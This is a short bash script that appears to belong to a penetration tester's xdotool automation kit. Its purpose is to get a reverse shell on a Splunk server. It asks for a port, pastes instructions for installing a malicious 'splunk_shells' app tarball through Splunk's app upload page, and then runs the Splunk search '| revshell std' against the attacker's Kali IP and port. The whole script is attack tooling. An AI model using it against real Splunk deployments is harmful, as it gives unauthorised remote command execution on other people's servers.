#!/bin/bash

: '
Create splunk rev shell
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
source ~/Desktop/base/code/xdotool/helpers/find_and_replace_in_file.sh

REV_FOLDER="${HOME}/Desktop/base/code/xdotool/scripts/shell/msfvenom/.files/reverse_shell_splunk"

# Generate gui form
generate_form "PORT"

PORT=${form_data["PORT"]}

paste_command "# upload ${REV_FOLDER}/splunk_shells-1.2.tar.gz -> click on the gear icon on the top left -> Install app from file -> Upload file"
xdotool key Return

paste_command "#after uploading and restarting the app search for '| revshell std ${KALI_IP} ${PORT}'"
xdotool key Return

